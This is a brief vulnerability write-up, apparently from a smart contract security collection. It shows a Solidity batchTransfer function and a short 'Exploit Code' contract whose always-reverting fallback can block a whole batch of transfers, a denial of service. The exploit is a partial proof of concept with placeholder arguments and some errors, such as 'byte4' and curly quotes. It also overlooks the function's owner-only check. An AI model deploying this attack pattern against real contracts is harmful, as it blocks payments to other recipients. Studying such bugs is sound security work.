## Vulnerable Code

```javascript
function batchTransfer(address[] _destinations, uint256[] _amounts) 
        public
        ownerOnly()
        {
            require(_destinations.length == _amounts.length);

            for (uint i = 0; i < _destinations.length; i++) {
                if (_destinations[i] != 0x0) {
                    _destinations[i].transfer(_amounts[i]);   //Vulnerable position 
                }
            }
        }
```



## Exploit Code

```javascript
contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“batchTransfer(address[], uint256[])”)), ..., ...);
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Now let's look at the position of "//Vulnerable position", as we all know 'transfer' can revert transaction if failed.so if one of '_destinations' element is failed then other address will be affect. ps:"...." represent an appropriate parameter

